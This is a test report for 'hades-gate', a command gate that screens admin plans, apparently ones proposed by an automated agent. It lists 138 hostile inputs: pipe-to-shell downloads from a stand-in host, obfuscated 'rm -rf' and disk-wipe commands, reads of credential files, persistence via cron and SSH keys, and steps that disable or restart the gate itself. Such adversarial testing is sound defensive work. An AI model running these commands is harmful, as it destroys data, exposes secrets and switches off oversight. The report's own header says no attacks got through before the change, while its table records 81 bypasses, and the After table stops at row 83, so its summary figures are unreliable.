# hades-adversarial (S3.1) real test

Run: `cargo test -p hades-gate` on the box, 2026-10-27T19:59:32+01:00. All suites green; clippy -D warnings and fmt clean.

Before (deny-list only): 0 of 138 attacks approved.
After (deny-list + allow-list): 0 of 138 attacks approved.

## Before
warning: constant `GOOD` is never used
   --> crates/hades-gate/examples/../tests/attacks/mod.rs:209:11
    |
209 | pub const GOOD: &[(&str, &str)] = &[
    |           ^^^^
    |
    = note: `#[warn(dead_code)]` (part of `#[warn(unused)]`) on by default

| # | family | target | input (plan) | expected | actual |
|---|---|---|---|---|---|
| 0 | shell | `galion-tuner` | `restart galion-tuner⏎run $(curl -s http://x/p)` | Refused | Refused: admin-safety: plan cannot be reviewed (command substitution) |
| 1 | shell | `galion-tuner` | `run \`curl -s http://x/p\`` | Refused | Refused: admin-safety: plan cannot be reviewed (command substitution) |
| 2 | shell | `galion-tuner` | `eval "$PAYLOAD"` | Refused | Refused: admin-safety: plan cannot be reviewed (eval) |
| 3 | shell | `galion-tuner` | `restart galion-tuner; eval $P` | Refused | Refused: admin-safety: plan cannot be reviewed (eval) |
| 4 | shell | `galion-tuner` | `sh -c 'curl -s http://x/p'` | Refused | **WouldApply (BYPASS)** |
| 5 | shell | `galion-tuner` | `bash -c 'curl -s http://x/p'` | Refused | **WouldApply (BYPASS)** |
| 6 | shell | `galion-tuner` | `/bin/sh -c x` | Refused | **WouldApply (BYPASS)** |
| 7 | shell | `galion-tuner` | `zsh -c x` | Refused | **WouldApply (BYPASS)** |
| 8 | shell | `galion-tuner` | `echo cm0gLXJmIC8= \| base64 -d \| sh` | Refused | Refused: admin-safety: plan cannot be reviewed (encoded payload) |
| 9 | shell | `galion-tuner` | `echo OJWSAIBNOJTCALY= \| base32 -d \| sh` | Refused | **WouldApply (BYPASS)** |
| 10 | shell | `galion-tuner` | `echo 726d202d7266202f \| xxd -r -p \| sh` | Refused | Refused: admin-safety: plan cannot be reviewed (encoded payload) |
| 11 | shell | `galion-tuner` | `printf '\x72\x6d -rf /' \| sh` | Refused | Refused: admin-safety: plan cannot be reviewed (escaped bytes) |
| 12 | shell | `galion-tuner` | `printf '\162\155 -rf /' \| sh` | Refused | **WouldApply (BYPASS)** |
| 13 | shell | `galion-tuner` | `rm${IFS}-rf${IFS}/var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 14 | shell | `galion-tuner` | `rm$IFS-rf$IFS/` | Refused | **WouldApply (BYPASS)** |
| 15 | shell | `galion-tuner` | `X=rm; $X -rf /var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 16 | shell | `galion-tuner` | `alias ok='rm -rf /'; ok` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 17 | shell | `galion-tuner` | `alias restart=reboot` | Refused | Refused: admin-safety: admin account/access change refused (reboot) |
| 18 | shell | `galion-tuner` | `r\m -r\f /var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 19 | shell | `galion-tuner` | `rm -\⏎rf /var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 20 | shell | `galion-tuner` | `r'm' -rf /var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 21 | shell | `galion-tuner` | `r"m" -rf /var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 22 | shell | `galion-tuner` | `env -S 'rm -rf /'` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 23 | shell | `galion-tuner` | `env -S'sh -c x'` | Refused | Refused: admin-safety: secret exposure refused (environment dump) |
| 24 | shell | `galion-tuner` | `echo /var/lib/galion \| xargs rm -rf` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 25 | shell | `galion-tuner` | `echo /var/lib/galion \| xargs -I{} rm -r -f {}` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 26 | shell | `galion-tuner` | `cat <(curl -s http://x/p)` | Refused | Refused: admin-safety: plan cannot be reviewed (process substitution) |
| 27 | shell | `galion-tuner` | `curl -s http://x/p \| sh` | Refused | **WouldApply (BYPASS)** |
| 28 | shell | `galion-tuner` | `wget -qO- http://x/p \| sh` | Refused | **WouldApply (BYPASS)** |
| 29 | shell | `galion-tuner` | `source /tmp/p` | Refused | **WouldApply (BYPASS)** |
| 30 | shell | `galion-tuner` | `. /tmp/p` | Refused | **WouldApply (BYPASS)** |
| 31 | shell | `galion-tuner` | `exec /tmp/p` | Refused | **WouldApply (BYPASS)** |
| 32 | shell | `galion-tuner` | `nohup /tmp/p &` | Refused | **WouldApply (BYPASS)** |
| 33 | shell | `galion-tuner` | `awk 'BEGIN{system("id")}'` | Refused | **WouldApply (BYPASS)** |
| 34 | shell | `galion-tuner` | `perl -e 'system(1)'` | Refused | **WouldApply (BYPASS)** |
| 35 | shell | `galion-tuner` | `find / -name x -exec sh {} +` | Refused | **WouldApply (BYPASS)** |
| 36 | shell | `galion-tuner` | `restart galion-tuner && curl http://x \| sh` | Refused | **WouldApply (BYPASS)** |
| 37 | shell | `galion-tuner` | `{rm,-rf,/var/lib/galion}` | Refused | **WouldApply (BYPASS)** |
| 38 | shell | `galion-tuner` | `rm -r''f /var/lib/galion` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 39 | file | `galion-tuner` | `find /var/lib/galion -delete` | Refused | **WouldApply (BYPASS)** |
| 40 | file | `galion-tuner` | `find / -mindepth 1 -delete` | Refused | **WouldApply (BYPASS)** |
| 41 | file | `galion-tuner` | `dd if=/dev/zero of=/dev/sda bs=1M` | Refused | Refused: admin-safety: destructive command refused (dd) |
| 42 | file | `galion-tuner` | `dd of=/dev/vda` | Refused | Refused: admin-safety: destructive command refused (dd) |
| 43 | file | `galion-tuner` | `dd bs=1M of=/dev/sda if=/dev/zero` | Refused | **WouldApply (BYPASS)** |
| 44 | file | `galion-tuner` | `dd  bs=1M  of=/dev/nvme0n1` | Refused | **WouldApply (BYPASS)** |
| 45 | file | `galion-tuner` | `cat /dev/zero > /dev/sda` | Refused | Refused: admin-safety: destructive command refused (write to a disk device) |
| 46 | file | `galion-tuner` | `cat /dev/zero >/dev/xvda` | Refused | **WouldApply (BYPASS)** |
| 47 | file | `galion-tuner` | `truncate -s 0 /var/lib/galion/memory.db` | Refused | Refused: admin-safety: destructive command refused (truncate) |
| 48 | file | `galion-tuner` | `shred -u /var/lib/galion/memory.db` | Refused | Refused: admin-safety: destructive command refused (shred) |
| 49 | file | `galion-tuner` | `echo > /etc/fstab` | Refused | **WouldApply (BYPASS)** |
| 50 | file | `galion-tuner` | `echo x >/etc/hosts` | Refused | **WouldApply (BYPASS)** |
| 51 | file | `galion-tuner` | `: > /var/lib/galion/memory.db` | Refused | **WouldApply (BYPASS)** |
| 52 | file | `galion-tuner` | `echo nameserver 0.0.0.0 >> /etc/resolv.conf` | Refused | **WouldApply (BYPASS)** |
| 53 | file | `galion-tuner` | `cp /dev/null /var/lib/galion/memory.db` | Refused | **WouldApply (BYPASS)** |
| 54 | file | `galion-tuner` | `mv /tmp/x /etc/systemd/system/galion-one.service` | Refused | **WouldApply (BYPASS)** |
| 55 | file | `galion-tuner` | `mv /dev/null /var/lib/galion/memory.db` | Refused | **WouldApply (BYPASS)** |
| 56 | file | `galion-tuner` | `rsync -a --delete /empty/ /var/lib/galion/` | Refused | **WouldApply (BYPASS)** |
| 57 | file | `galion-tuner` | `rsync -a --delete-after /empty/ /opt/galion/` | Refused | **WouldApply (BYPASS)** |
| 58 | file | `galion-tuner` | `tar -xf /tmp/x.tar --overwrite -C /etc` | Refused | **WouldApply (BYPASS)** |
| 59 | file | `galion-tuner` | `tar --overwrite -xf /tmp/x.tar -C /` | Refused | **WouldApply (BYPASS)** |
| 60 | file | `galion-tuner` | `tar -xf /tmp/x.tar -C /` | Refused | **WouldApply (BYPASS)** |
| 61 | file | `galion-tuner` | `rm /var/lib/galion/memory.db` | Refused | **WouldApply (BYPASS)** |
| 62 | file | `galion-tuner` | `rm -v /var/lib/galion/memory.db` | Refused | **WouldApply (BYPASS)** |
| 63 | file | `galion-tuner` | `rm --dir /var/lib/galion` | Refused | **WouldApply (BYPASS)** |
| 64 | file | `galion-tuner` | `unlink /var/lib/galion/memory.db` | Refused | Refused: admin-safety: destructive command refused (unlink) |
| 65 | file | `galion-tuner` | `sqlite3 memory.db 'DELETE FROM memories'` | Refused | Refused: admin-safety: destructive command refused (delete from) |
| 66 | file | `galion-tuner` | `git push origin +main` | Refused | **WouldApply (BYPASS)** |
| 67 | file | `galion-tuner` | `git push --force-with-lease origin main` | Refused | Refused: admin-safety: destructive command refused (force push) |
| 68 | file | `galion-tuner` | `git checkout -- .` | Refused | **WouldApply (BYPASS)** |
| 69 | file | `galion-tuner` | `git clean -xdf` | Refused | **WouldApply (BYPASS)** |
| 70 | file | `galion-tuner` | `install -m 644 /tmp/x /etc/sudoers.d/x` | Refused | Refused: admin-safety: admin account/access change refused (sudoers) |
| 71 | file | `galion-tuner` | `ln -sf /dev/null /var/lib/galion/memory.db` | Refused | **WouldApply (BYPASS)** |
| 72 | file | `galion-tuner` | `mkswap /dev/sda1` | Refused | **WouldApply (BYPASS)** |
| 73 | file | `galion-tuner` | `mount -o remount,ro /` | Refused | **WouldApply (BYPASS)** |
| 74 | file | `galion-tuner` | `sed -i d /etc/fstab` | Refused | **WouldApply (BYPASS)** |
| 75 | file | `galion-tuner` | `tee /etc/fstab < /dev/null` | Refused | **WouldApply (BYPASS)** |
| 76 | access | `galion-tuner` | `systemctl mask galion-one` | Refused | **WouldApply (BYPASS)** |
| 77 | access | `galion-tuner` | `systemctl disable --now galion-one` | Refused | **WouldApply (BYPASS)** |
| 78 | access | `galion-tuner` | `systemctl stop galion-control` | Refused | Refused: admin-safety: secret exposure refused (galion-control key) |
| 79 | access | `galion-tuner` | `systemctl mask ssh.socket` | Refused | Refused: admin-safety: admin account/access change refused (ssh) |
| 80 | access | `galion-tuner` | `systemctl isolate rescue.target` | Refused | **WouldApply (BYPASS)** |
| 81 | access | `galion-tuner` | `systemctl kill galion-tuner` | Refused | **WouldApply (BYPASS)** |
| 82 | access | `galion-tuner` | `crontab -r` | Refused | Refused: admin-safety: admin account/access change refused (crontab) |
| 83 | access | `galion-tuner` | `echo '* * * * * root /tmp/p' > /etc/cron.d/x` | Refused | **WouldApply (BYPASS)** |
| 84 | access | `galion-tuner` | `ssh-keygen -f /tmp/k -N ''` | Refused | **WouldApply (BYPASS)** |
| 85 | access | `galion-tuner` | `ssh-copy-id slavik@box` | Refused | **WouldApply (BYPASS)** |
| 86 | access | `galion-tuner` | `echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys` | Refused | Refused: admin-safety: admin account/access change refused (authorized_keys) |
| 87 | access | `galion-tuner` | `cp /tmp/k /root/.ssh/authorized_keys2` | Refused | Refused: admin-safety: admin account/access change refused (authorized_keys) |
| 88 | access | `galion-tuner` | `chattr +i /etc/resolv.conf` | Refused | Refused: admin-safety: admin account/access change refused (attribute change) |
| 89 | access | `galion-tuner` | `usermod -L slavik` | Refused | Refused: admin-safety: admin account/access change refused (usermod) |
| 90 | access | `galion-tuner` | `passwd -l root` | Refused | Refused: admin-safety: admin account/access change refused (passwd) |
| 91 | access | `galion-tuner` | `echo slavik:x \| chpasswd` | Refused | Refused: admin-safety: admin account/access change refused (chpasswd) |
| 92 | access | `galion-tuner` | `iptables -F` | Refused | Refused: admin-safety: admin account/access change refused (firewall) |
| 93 | access | `galion-tuner` | `iptables-restore < /tmp/r` | Refused | **WouldApply (BYPASS)** |
| 94 | access | `galion-tuner` | `nft flush ruleset` | Refused | Refused: admin-safety: admin account/access change refused (firewall) |
| 95 | access | `galion-tuner` | `ip link set eth0 down` | Refused | **WouldApply (BYPASS)** |
| 96 | access | `galion-tuner` | `ip route del default` | Refused | **WouldApply (BYPASS)** |
| 97 | access | `galion-tuner` | `cat /opt/galion/galion-light/secrets/github` | Refused | Refused: admin-safety: secret exposure refused (secrets dir) |
| 98 | access | `galion-tuner` | `ls /opt/galion/galion-light/secrets` | Refused | Refused: admin-safety: secret exposure refused (secrets dir) |
| 99 | access | `galion-tuner` | `tar -cf /tmp/s.tar /root/galion-secrets` | Refused | Refused: admin-safety: secret exposure refused (secrets dir) |
| 100 | access | `galion-tuner` | `cat /root/.config/gh/hosts.yml` | Refused | **WouldApply (BYPASS)** |
| 101 | access | `galion-tuner` | `cat /etc/cloudflared/cert.pem` | Refused | **WouldApply (BYPASS)** |
| 102 | access | `galion-tuner` | `cat ~/.cloudflared/x.json` | Refused | **WouldApply (BYPASS)** |
| 103 | access | `galion-tuner` | `cat /proc/self/environ` | Refused | Refused: admin-safety: secret exposure refused (process environment) |
| 104 | access | `galion-tuner` | `strings /proc/1/environ` | Refused | Refused: admin-safety: secret exposure refused (process environment) |
| 105 | access | `galion-tuner` | `gpg --export-secret-keys` | Refused | **WouldApply (BYPASS)** |
| 106 | access | `galion-tuner` | `setcap cap_sys_admin+ep /tmp/p` | Refused | **WouldApply (BYPASS)** |
| 107 | access | `galion-tuner` | `chmod u+s /tmp/p` | Refused | Refused: admin-safety: admin account/access change refused (permission change) |
| 108 | access | `galion-tuner` | `sysctl -w kernel.modules_disabled=1` | Refused | **WouldApply (BYPASS)** |
| 109 | access | `galion-tuner` | `modprobe -r e1000` | Refused | **WouldApply (BYPASS)** |
| 110 | access | `galion-tuner` | `kill -9 1` | Refused | **WouldApply (BYPASS)** |
| 111 | access | `galion-tuner` | `pkill sshd` | Refused | Refused: admin-safety: admin account/access change refused (sshd) |
| 112 | access | `galion-tuner` | `touch /opt/galion/hades/DISABLED` | Refused | **WouldApply (BYPASS)** |
| 113 | access | `galion-tuner` | `curl -X POST http://127.0.0.1:19410/v1/stop` | Refused | **WouldApply (BYPASS)** |
| 114 | unicode | `galion-tuner` | `rU+043C -rf /var/lib/galion` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 115 | unicode | `galion-tuner` | `rmU+00A0-rf /var/lib/galion` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 116 | unicode | `galion-tuner` | `rm -rf /var/lib/galionU+200B` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 117 | unicode | `galion-tuner` | `U+FF52U+FF4D -rf /` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 118 | unicode | `galion-tuner` | `rm U+2010rf /var/lib/galion` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 119 | unicode | `galion-tuner` | `restart galion-tunerU+202Efr- mr` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 120 | unicode | `galion-tuner` | `rm -rf /\r` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 121 | unicode | `galion-tunU+0435r` | `restart galion-tuner` | Refused | Refused: malformed token: target name |
| 122 | unicode | `hU+0430des-gate` | `restart` | Refused | Refused: malformed token: target name |
| 123 | traversal | `galion-tuner` | `switch dist/bin to ../../etc` | Refused | **WouldApply (BYPASS)** |
| 124 | traversal | `galion-tuner` | `operator runs deploy/../../../tmp/p.sh` | Refused | **WouldApply (BYPASS)** |
| 125 | traversal | `galion-tuner` | `switch dist/bin to /etc/systemd/system` | Refused | **WouldApply (BYPASS)** |
| 126 | traversal | `galion-tuner` | `operator runs /tmp/p.sh` | Refused | **WouldApply (BYPASS)** |
| 127 | traversal | `galion-tuner` | `operator runs deploy/rollback.sh/../../tmp/p` | Refused | **WouldApply (BYPASS)** |
| 128 | traversal | `galion-tuner` | `switch dist/bin to dist/../../root` | Refused | **WouldApply (BYPASS)** |
| 129 | traversal | `../sshd` | `restart` | Refused | Refused: malformed token: target name |
| 130 | traversal | `galion-tuner/../../hades-gate` | `restart` | Refused | Refused: malformed token: target name |
| 131 | traversal | `..` | `restart` | Refused | **WouldApply (BYPASS)** |
| 132 | traversal | `galion-tuner..hades` | `restart` | Refused | Refused: admin-safety: protected target refused (hades) |
| 133 | traversal | `galion-tuner:22` | `restart` | Refused | **WouldApply (BYPASS)** |
| 134 | traversal | `root@galion-tuner` | `restart` | Refused | Refused: admin-safety: protected target refused (root) |
| 135 | traversal | `galion-tuner` | `restart galion-control` | Refused | Refused: admin-safety: secret exposure refused (galion-control key) |
| 136 | traversal | `galion-tuner` | `restart hades-gate` | Refused | **WouldApply (BYPASS)** |
| 137 | traversal | `galion-tuner` | `restart ssh` | Refused | Refused: admin-safety: admin account/access change refused (ssh) |

attacks: 138, bypasses (WouldApply): 81

## After
| # | family | target | input (plan) | expected | actual |
|---|---|---|---|---|---|
| 0 | shell | `galion-tuner` | `restart galion-tuner⏎run $(curl -s http://x/p)` | Refused | Refused: admin-safety: plan cannot be reviewed (command substitution) |
| 1 | shell | `galion-tuner` | `run \`curl -s http://x/p\`` | Refused | Refused: admin-safety: plan cannot be reviewed (command substitution) |
| 2 | shell | `galion-tuner` | `eval "$PAYLOAD"` | Refused | Refused: admin-safety: plan cannot be reviewed (eval) |
| 3 | shell | `galion-tuner` | `restart galion-tuner; eval $P` | Refused | Refused: admin-safety: plan cannot be reviewed (eval) |
| 4 | shell | `galion-tuner` | `sh -c 'curl -s http://x/p'` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 5 | shell | `galion-tuner` | `bash -c 'curl -s http://x/p'` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 6 | shell | `galion-tuner` | `/bin/sh -c x` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 7 | shell | `galion-tuner` | `zsh -c x` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 8 | shell | `galion-tuner` | `echo cm0gLXJmIC8= \| base64 -d \| sh` | Refused | Refused: admin-safety: plan cannot be reviewed (encoded payload) |
| 9 | shell | `galion-tuner` | `echo OJWSAIBNOJTCALY= \| base32 -d \| sh` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 10 | shell | `galion-tuner` | `echo 726d202d7266202f \| xxd -r -p \| sh` | Refused | Refused: admin-safety: plan cannot be reviewed (encoded payload) |
| 11 | shell | `galion-tuner` | `printf '\x72\x6d -rf /' \| sh` | Refused | Refused: admin-safety: plan cannot be reviewed (escaped bytes) |
| 12 | shell | `galion-tuner` | `printf '\162\155 -rf /' \| sh` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 13 | shell | `galion-tuner` | `rm${IFS}-rf${IFS}/var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 14 | shell | `galion-tuner` | `rm$IFS-rf$IFS/` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 15 | shell | `galion-tuner` | `X=rm; $X -rf /var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 16 | shell | `galion-tuner` | `alias ok='rm -rf /'; ok` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 17 | shell | `galion-tuner` | `alias restart=reboot` | Refused | Refused: admin-safety: admin account/access change refused (reboot) |
| 18 | shell | `galion-tuner` | `r\m -r\f /var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 19 | shell | `galion-tuner` | `rm -\⏎rf /var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 20 | shell | `galion-tuner` | `r'm' -rf /var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 21 | shell | `galion-tuner` | `r"m" -rf /var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 22 | shell | `galion-tuner` | `env -S 'rm -rf /'` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 23 | shell | `galion-tuner` | `env -S'sh -c x'` | Refused | Refused: admin-safety: secret exposure refused (environment dump) |
| 24 | shell | `galion-tuner` | `echo /var/lib/galion \| xargs rm -rf` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 25 | shell | `galion-tuner` | `echo /var/lib/galion \| xargs -I{} rm -r -f {}` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 26 | shell | `galion-tuner` | `cat <(curl -s http://x/p)` | Refused | Refused: admin-safety: plan cannot be reviewed (process substitution) |
| 27 | shell | `galion-tuner` | `curl -s http://x/p \| sh` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 28 | shell | `galion-tuner` | `wget -qO- http://x/p \| sh` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 29 | shell | `galion-tuner` | `source /tmp/p` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 30 | shell | `galion-tuner` | `. /tmp/p` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 31 | shell | `galion-tuner` | `exec /tmp/p` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 32 | shell | `galion-tuner` | `nohup /tmp/p &` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 33 | shell | `galion-tuner` | `awk 'BEGIN{system("id")}'` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 34 | shell | `galion-tuner` | `perl -e 'system(1)'` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 35 | shell | `galion-tuner` | `find / -name x -exec sh {} +` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 36 | shell | `galion-tuner` | `restart galion-tuner && curl http://x \| sh` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 37 | shell | `galion-tuner` | `{rm,-rf,/var/lib/galion}` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 38 | shell | `galion-tuner` | `rm -r''f /var/lib/galion` | Refused | Refused: admin-safety: destructive command refused (rm -r) |
| 39 | file | `galion-tuner` | `find /var/lib/galion -delete` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 40 | file | `galion-tuner` | `find / -mindepth 1 -delete` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 41 | file | `galion-tuner` | `dd if=/dev/zero of=/dev/sda bs=1M` | Refused | Refused: admin-safety: destructive command refused (dd) |
| 42 | file | `galion-tuner` | `dd of=/dev/vda` | Refused | Refused: admin-safety: destructive command refused (dd) |
| 43 | file | `galion-tuner` | `dd bs=1M of=/dev/sda if=/dev/zero` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 44 | file | `galion-tuner` | `dd  bs=1M  of=/dev/nvme0n1` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 45 | file | `galion-tuner` | `cat /dev/zero > /dev/sda` | Refused | Refused: admin-safety: destructive command refused (write to a disk device) |
| 46 | file | `galion-tuner` | `cat /dev/zero >/dev/xvda` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 47 | file | `galion-tuner` | `truncate -s 0 /var/lib/galion/memory.db` | Refused | Refused: admin-safety: destructive command refused (truncate) |
| 48 | file | `galion-tuner` | `shred -u /var/lib/galion/memory.db` | Refused | Refused: admin-safety: destructive command refused (shred) |
| 49 | file | `galion-tuner` | `echo > /etc/fstab` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 50 | file | `galion-tuner` | `echo x >/etc/hosts` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 51 | file | `galion-tuner` | `: > /var/lib/galion/memory.db` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 52 | file | `galion-tuner` | `echo nameserver 0.0.0.0 >> /etc/resolv.conf` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 53 | file | `galion-tuner` | `cp /dev/null /var/lib/galion/memory.db` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 54 | file | `galion-tuner` | `mv /tmp/x /etc/systemd/system/galion-one.service` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 55 | file | `galion-tuner` | `mv /dev/null /var/lib/galion/memory.db` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 56 | file | `galion-tuner` | `rsync -a --delete /empty/ /var/lib/galion/` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 57 | file | `galion-tuner` | `rsync -a --delete-after /empty/ /opt/galion/` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 58 | file | `galion-tuner` | `tar -xf /tmp/x.tar --overwrite -C /etc` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 59 | file | `galion-tuner` | `tar --overwrite -xf /tmp/x.tar -C /` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 60 | file | `galion-tuner` | `tar -xf /tmp/x.tar -C /` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 61 | file | `galion-tuner` | `rm /var/lib/galion/memory.db` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 62 | file | `galion-tuner` | `rm -v /var/lib/galion/memory.db` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 63 | file | `galion-tuner` | `rm --dir /var/lib/galion` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 64 | file | `galion-tuner` | `unlink /var/lib/galion/memory.db` | Refused | Refused: admin-safety: destructive command refused (unlink) |
| 65 | file | `galion-tuner` | `sqlite3 memory.db 'DELETE FROM memories'` | Refused | Refused: admin-safety: destructive command refused (delete from) |
| 66 | file | `galion-tuner` | `git push origin +main` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 67 | file | `galion-tuner` | `git push --force-with-lease origin main` | Refused | Refused: admin-safety: destructive command refused (force push) |
| 68 | file | `galion-tuner` | `git checkout -- .` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 69 | file | `galion-tuner` | `git clean -xdf` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 70 | file | `galion-tuner` | `install -m 644 /tmp/x /etc/sudoers.d/x` | Refused | Refused: admin-safety: admin account/access change refused (sudoers) |
| 71 | file | `galion-tuner` | `ln -sf /dev/null /var/lib/galion/memory.db` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 72 | file | `galion-tuner` | `mkswap /dev/sda1` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 73 | file | `galion-tuner` | `mount -o remount,ro /` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 74 | file | `galion-tuner` | `sed -i d /etc/fstab` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 75 | file | `galion-tuner` | `tee /etc/fstab < /dev/null` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 76 | access | `galion-tuner` | `systemctl mask galion-one` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 77 | access | `galion-tuner` | `systemctl disable --now galion-one` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 78 | access | `galion-tuner` | `systemctl stop galion-control` | Refused | Refused: admin-safety: secret exposure refused (galion-control key) |
| 79 | access | `galion-tuner` | `systemctl mask ssh.socket` | Refused | Refused: admin-safety: admin account/access change refused (ssh) |
| 80 | access | `galion-tuner` | `systemctl isolate rescue.target` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 81 | access | `galion-tuner` | `systemctl kill galion-tuner` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 82 | access | `galion-tuner` | `crontab -r` | Refused | Refused: admin-safety: admin account/access change refused (crontab) |
| 83 | access | `galion-tuner` | `echo '* * * * * root /tmp/p' > /etc/cron.d/x` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
